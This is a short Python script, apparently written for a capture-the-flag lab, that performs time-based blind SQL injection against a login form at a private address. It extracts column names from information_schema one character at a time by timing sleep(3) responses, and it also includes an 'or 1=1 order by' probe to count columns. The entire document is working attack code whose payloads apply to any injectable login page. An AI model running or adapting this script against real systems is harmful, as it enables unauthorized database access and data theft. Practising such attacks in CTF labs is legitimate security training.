# Script created to a time based SQLi CTF

import requests
import time
import string

def req(query):
    url = "http://10.10.0.8/"
    data = {'username': query, 'password':'asdasd'}
    r = requests.post(url, data=data)
    return r.text

def fuzz():
    printables = string.printable
    database = ''

    while True:
        for char in printables:
            guessed_database = database + char
            query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name='users' and table_schema='cc' limit 2,1),1,"+str(len(guessed_database))+")='"+guessed_database+"',sleep(3),NULL); -- -"
            
            print(guessed_database)

            before_request = time.time()
            req(query)
            after_request = time.time()

            total = after_request - before_request

            if (int(total) >= 3):
                database = guessed_database
                break


def orderby():
    numbers = list({1,2,3,4,5,6,7,8,9})

    for num in numbers:
        query = "' or 1=1 order by " + str(num) + ' -- -'
        if not 'Username or password is invalid!' in req(query):
            print("Correct is: " + str(num))

fuzz()